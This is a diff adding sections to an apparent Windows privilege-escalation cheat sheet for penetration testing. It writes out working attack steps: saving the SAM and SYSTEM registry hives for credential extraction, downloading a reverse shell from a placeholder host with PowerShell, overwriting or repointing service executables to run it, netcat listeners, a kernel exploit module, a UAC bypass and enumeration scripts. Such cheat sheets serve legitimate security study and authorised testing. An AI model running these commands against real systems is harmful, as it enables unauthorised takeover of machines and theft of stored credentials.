@@ -159,3 +159,138 @@ use exploit/windows/local/service_permissions
 # Local Exploit Suggester
 use post/multi/recon/local_exploit_suggester
 ```
+
+## Windows Registry
+```
+Computer\HKEY_CLASSES_ROOT\
+
+Computer\HKEY_CURRENT_USER\
+
+Computer\HKEY_LOCAL_MACHINE\
+
+Computer\HKEY_USERS\
+
+# Query
+reg query HKCU\environment /v TEMP
+reg query HKCU\environment /v *
+
+# Add Key
+reg add "hkcu\control panel\<key>"
+
+# Delete Key
+reg delete "hkcu\control panel\<key>" /f
+
+# Add Value
+reg add "hkcu\control panel\<key>" /v subs /t reg_sz /d twothousand /f
+
+# Search
+reg query HKCU /f <key> /s /e
+
+# Save
+reg save hklm\sam c:\sam
+reg save hklm\system c:\system
+```
+
+## Insecure Service Executables
+```
+accesschk.exe /accepteula -uwsv user "C:\program Files"
+
+wmic service list brief | findstr /i fileperm
+
+sc query | findstr /i fileperm
+
+powershell wget <IP>:<Port>/reverse_shell.exe -outfile .\reverse_shell.exe
+
+# Copy the reverse shell to the C:\program Files path and overwrite the existing service executable with the reverse shell
+
+# Start the Service
+net start filepermsvc
+
+# Start Listener
+nc -nlvp 1234
+```
+
+## Weak Registry Permissions
+```
+wmic service list brief | findstr /i reg
+
+# Query Registry Services
+sc qc regsvc
+
+reg query HKLM /f regsvc
+
+reg query HKLM\System\CurrentControlSet\Services\regsvc /v *
+
+# Add the reverse shell in Registry
+reg add HKLM\System\CurrentControlSet\Services\regsvc /v <value name> /t <type> /d <reverse shell location> /f
+
+# Start Service
+net start regsvc
+
+# Start Listener
+nc -nlvp 1234
+```
+
+## Insecure Service Permissions
+```
+# Check Permissions
+accesschk.exe /accepteula -uvqwc user *
+
+sc qc daclsvc
+
+sc config daclsvc binpath="\"<location of reverse shell>""
+
+# Start Service
+net start daclsvc
+
+# PowerUp.ps1
+powershell import-module .\PowerUp.ps1;invoke-allchecks
+```
+
+## Kernel Exploits
+
+[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+```
+$ python2 windows-exploit-suggester.py --update
+$ python2 windows-exploit-suggester.py --database <xls filename> --systeminfo <systeminfo file>
+
+# Metasploit Module
+use exploit/windows/local/ms13_053_schlamperei
+```
+
+## Unquoted Service Path
+```
+# Find Unquoted Service Path
+wmic service get name,pathname | findstr /v /i system32 | findstr /v \"
+
+# Query
+sc qc unquotedsvc
+
+# View Permissions
+icacls "<Location>"
+
+# Write Permssion
+accesschk.exe /accepteula -uvqdw "<Location>"
+
+#PowerUp.ps1
+powershell import-module .\PowerUp.ps1;Get-ServiceUnquoted
+```
+
+## Powershell UAC Bypass
+
+[Powershell UAC Bypass](https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/)
+
+```
+powershell -ep bypass .\escalate.ps1
+
+nc -lvp 1234
+```
+
+## WinPEAS Script
+
+[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+```
+.\winpeas.bat
+```
